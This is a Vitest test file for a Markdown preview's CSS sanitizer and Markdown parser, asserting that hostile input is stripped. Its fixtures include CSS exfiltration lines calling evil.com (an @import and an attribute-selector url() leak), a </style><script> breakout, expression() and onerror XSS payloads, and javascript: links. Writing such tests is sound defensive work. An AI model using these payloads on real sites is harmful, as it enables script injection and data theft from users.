import { describe, expect, it } from 'vitest'
import { parseMarkdown, sanitizeCustomCss } from './MarkdownPreview'

describe('sanitizeCustomCss', () => {
  it('returns empty string for empty input', () => {
    expect(sanitizeCustomCss('')).toBe('')
  })

  it('passes through safe declarations untouched', () => {
    const css = '.md-h1 { color: #333; font-weight: 700; }'
    expect(sanitizeCustomCss(css)).toBe(css)
  })

  it('strips @import directives', () => {
    const css = '@import url("http://evil.com/exfil.css"); .foo { color: red; }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/@import/i)
    expect(result).toContain('.foo')
  })

  it('strips </style> breakout attempts', () => {
    const css = '.foo { color: red; }</style><script>alert(1)</script>'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/<\/style/i)
  })

  it('neutralizes expression() (legacy IE script execution)', () => {
    const css = '.foo { width: expression(alert(1)); }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/expression\s*\(/i)
  })

  it('neutralizes http(s) url() references', () => {
    const httpCss = '.foo { background: url("http://evil.com/track.png"); }'
    const httpsCss = '.foo { background: url(https://evil.com/track.png); }'
    expect(sanitizeCustomCss(httpCss)).not.toContain('http://evil.com')
    expect(sanitizeCustomCss(httpsCss)).not.toContain('https://evil.com')
  })

  it('neutralizes protocol-relative url() references', () => {
    const css = '.foo { background: url(//evil.com/track.png); }'
    expect(sanitizeCustomCss(css)).not.toContain('//evil.com')
  })

  it('preserves data: url() references', () => {
    const css = '.foo { background: url(data:image/png;base64,iVBORw0KGgo=); }'
    const result = sanitizeCustomCss(css)
    expect(result).toContain('data:image/png;base64,iVBORw0KGgo=')
  })

  it('blocks attribute-selector exfiltration via url()', () => {
    const css = '[href^="secret"] { background: url("https://evil.com/leak"); }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toContain('https://evil.com')
  })

  it('handles case variations', () => {
    const css = '@IMPORT URL("http://x"); .a { WIDTH: EXPRESSION(x); }'
    const result = sanitizeCustomCss(css)
    expect(result).not.toMatch(/@import/i)
    expect(result).not.toMatch(/expression\s*\(/i)
  })
})

describe('parseMarkdown', () => {
  it('escapes raw html before preview rendering', () => {
    const html = parseMarkdown('<img src=x onerror=alert(1)><script>alert(1)</script>')

    expect(html).toContain('&lt;img')
    expect(html).toContain('&lt;script')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<script')
    expect(html).not.toMatch(/<[^>]+\sonerror=/)
  })

  it('sanitizes markdown link and image urls', () => {
    const html = parseMarkdown([
      '[bad](javascript:alert(1))',
      '![bad](javascript:alert(1))',
      '[protocol-relative](//evil.com)',
      '[ok](https://example.com)',
    ].join('\n'))

    expect(html).toContain('href="#"')
    expect(html).toContain('src="#"')
    expect(html).toContain('href="https://example.com"')
    expect(html).not.toContain('javascript:')
  })

  it('does not emit inline event handlers for generated images', () => {
    const html = parseMarkdown('![broken](https://example.com/missing.png)')

    expect(html).toContain('<img')
    expect(html).not.toContain('onerror=')
  })

  it('keeps fenced code and mermaid output as generated preview html', () => {
    const html = parseMarkdown([
      '```ts',
      'const value = "<tag>"',
      '```',
      '',
      '```mermaid',
      'graph TD',
      'A[Start] --> B[End]',
      '```',
    ].join('\n'))

    expect(html).toContain('md-code-wrapper')
    expect(html).toContain('md-mermaid-rendered')
    expect(html).toContain('&lt;tag&gt;')
    expect(html).not.toContain('<tag>')
  })
})
